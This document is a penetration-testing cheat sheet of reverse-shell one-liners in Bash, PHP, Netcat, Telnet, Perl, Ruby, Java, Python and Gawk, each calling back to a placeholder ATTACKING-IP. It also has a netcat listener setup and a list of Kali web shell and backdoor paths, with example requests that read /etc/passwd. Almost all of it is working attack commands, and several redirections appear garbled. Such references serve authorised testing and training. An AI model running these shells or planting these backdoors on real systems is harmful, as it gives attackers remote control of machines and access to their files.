# Reverse Shells

## Content
* [Setup Netcat listener](Setup-listening-netcat)
* [Bash](#Bash-Reverse-Shells)
* [PHP](#PHP-Reverse-Shell)
* [Netcat](#Netcat-Reverse-Shell)
* [Telnet](#Telnet-Reverse-Shell)
* [Perl](#Perl-Reverse-Shell)
* [Ruby](#Ruby-Reverse-Shell)
* [Java](#Java-Reverse-Shell)
* [Python](#Python-Reverse-Shell)
* [Gawk](#Gawk-Reverse-Shell)
* [Kali](#Kali-Web-Shells)

### Setup Listening Netcat

Your remote shell will need a listening netcat instance in order to connect back.
Set your Netcat listening shell on an allowed port

Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443

To setup a listening netcat instance, enter the following:
```shell
root@kali:~# nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
```
NAT requires a port forward

If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.

ATTACKING-IP is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).

### Bash Reverse Shells
```shell
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  
```
Or:
```shell
while read line 0<&5; do $line 2>&5 >&5; done

bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```
### PHP Reverse Shell

A useful PHP reverse shell:
```php
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```
### Netcat Reverse Shell
```shell
nc -e /bin/sh ATTACKING-IP 80

/bin/sh | nc ATTACKING-IP 80

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```
### Telnet Reverse Shell
```shell
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```
Remember to listen on 443 on the attacking machine also.

## Perl Reverse Shell
```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Perl Windows Reverse Shell
```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Ruby Reverse Shell
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java Reverse Shell
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Python Reverse Shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Gawk Reverse Shell
```shell
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```
## Kali Web Shells

The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.
### Kali PHP Web Shells

Kali PHP reverse shells and command shells:
Command 	Description
```shell
/usr/share/webshells/php/
php-reverse-shell.php
```

Pen Test Monkey - PHP Reverse Shell
```shell
/usr/share/webshells/
php/php-findsock-shell.php

/usr/share/webshells/
php/findsock.c
```

Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80

```shell
/usr/share/webshells/
php/simple-backdoor.php
```

PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: http://target.com/simple-
backdoor.php?cmd=cat+/etc/passwd

```shell
/usr/share/webshells/
php/php-backdoor.php
```

Larger PHP shell, with a text input box for command execution.
Tip: Executing Reverse Shells

The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.

### Kali Perl Reverse Shell

Kali perl reverse shell:
Command 	Description
```shell
/usr/share/webshells/perl/
perl-reverse-shell.pl
```

Pen Test Monkey - Perl Reverse Shell
```shell
/usr/share/webshells/
perl/perlcmd.cgi
```

Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd


Kali Coldfusion Shell:
Command 	Description
```shell
/usr/share/webshells/cfm/cfexec.cfm
```

Cold Fusion Shell - aka CFM Shell

### Kali ASP Shell

Classic ASP Reverse Shell + CMD shells:
Command 	Description
```shell
/usr/share/webshells/asp/
```
Kali ASPX Shells

ASP.NET reverse shells within Kali:
Command 	Description
```shell
/usr/share/webshells/aspx/
```

### Kali JSP Reverse Shell

Kali JSP Reverse Shell:
Command 	Description
```shell
/usr/share/webshells/jsp/jsp-reverse.jsp
```

Special thanks *@[pentestmonkey](https://twitter.com/pentestmonkey)*
